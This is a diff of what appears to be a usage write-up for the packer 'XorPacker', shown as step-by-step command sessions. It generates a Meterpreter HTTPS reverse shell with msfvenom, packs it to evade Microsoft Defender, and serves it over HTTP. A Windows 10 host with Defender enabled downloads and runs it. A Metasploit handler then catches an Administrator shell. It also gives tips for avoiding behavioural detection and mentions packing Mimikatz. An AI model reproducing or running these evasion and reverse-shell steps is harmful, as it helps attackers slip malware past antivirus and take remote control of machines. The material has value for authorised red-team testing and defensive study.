@@ -74,10 +74,9 @@ Reading state information... Done
 <SNIP>
 
 
--------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------
 Step 2 - Generate an encrypted packed version of the tool Mimikatz.exe (x64) using 'XorPacker'
--------------------------------------------------------------------------------------------------
-
+--------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/XorPacker-master/$ curl -v http://192.168.1.113:8081/mimikatz.exe -O
 *   Trying 192.168.1.113:8081...
@@ -175,18 +174,16 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
         ssp :
         credman :
         cloudap :       KO
-        
 <SNIP>
 
 
-
 =========================================================================================================================================================
-PoC 1 - Example with a Meterpreter reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+PoC 2 - Example with a Meterpreter reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
 =========================================================================================================================================================
 
-----------------------------------------------------------------------------
+------------------------------------------------------------------------------------
 Step 1 - Generate a Meterpreter reverse shell HTTPS (x64) using 'Msfvenom'
-----------------------------------------------------------------------------
+------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/XorPacker-master$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.30 LPORT=443 EXITFUNC=thread 
 -a x64 -f exe -x ../Windows/pslist64.exe > meterpreter_rev_https_pslist64.exe
@@ -195,9 +192,8 @@ No encoder specified, outputting raw payload
 Payload size: 653 bytes
 Final size of exe file: 192000 bytes
 
-
 -------------------------------------------------------------------------------------------------------------
-Step 2 - Generate an encrypted packed version of the Meterpreter reverse shell HTTPS (x64) using 'XorPacker'
+Step 2 - Use 'XorPacker' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
 -------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -h
@@ -218,26 +214,21 @@ jeff@kali:~/Documents/Tools/XorPacker-master$ ./xorpacker.py -f meterpreter_rev_
 
 [>] Payload file: meterpreter_rev_https_pslist64.exe
 [>] Payload type: UNMANAGED
-
 [*] Encrypting payload...
 [*] Compressing payload...
 [*] Encoding payload...
 [*] Generating source file...
-
 [>] You should now build payload.go
-
 
 jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go 
 
 jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al payload.exe 
 -rwxr-xr-x 1 jeff jeff 3365132 Dec 28 10:29 payload.exe
 
-
----------------------------------------------------------------------------------------------------------------------------------------------
-Step 3 - Download and execute the packed version of the Meterpreter reverse shell HTTPS (x64) on a Windows 10 laptop without being detected 
-         nor blocked by the MS Defender AV
----------------------------------------------------------------------------------------------------------------------------------------------
-
+------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute on a Windows 10 laptop the packed version of the Meterpreter HTTPS reverse shell (x64) without being 
+         detected nor blocked by the Microsoft Defender Antivirus 
+------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/XorPacker-master$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
@@ -245,12 +236,30 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.1.113 - - [28/Dec/2022 10:08:57] "GET /payload.exe HTTP/1.1" 200 -  
 
 
+PS C:\Users\Administrator\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile SuperRevShellHttps.exe
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL                                                                                                                                                              
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 28/12/2022 00:46:20
 
 
+PS C:\Users\Administrator\Downloads> .\SuperRevShellHttps.exe
+PS C:\Users\Administrator\Downloads>
+
+Important note regarding AV detection  
+-------------------------------------
+=> In general, with Metasploit if you want to limit the chance of being detected & blocked by antivirus solutions, it is recommanded to avoid using known 
+   post-exploitation modules and to use the Meterpreter session mainly as a way to pivot and perform lateral movement (i.e. socks_proxy + proxychains).  
+   Indeed, if you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will often detect these 
+   actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
 
 
-
-
+------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
+------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/Windows$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; 
 set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true;  
@@ -306,6 +315,7 @@ msf6 exploit(multi/handler) > sessions -i 1
 
 meterpreter > getuid 
 Server username: PO718687\Administrator
+
 meterpreter > shell
 Process 7828 created.
 Channel 1 created.
@@ -314,7 +324,7 @@ Microsoft Windows [Version 10.0.19044.2364]
 
 C:\Users\Administrator.PO718687\Downloads>exit
 exit
-meterpreter > 
 
+meterpreter > 
 
 <SNIP>
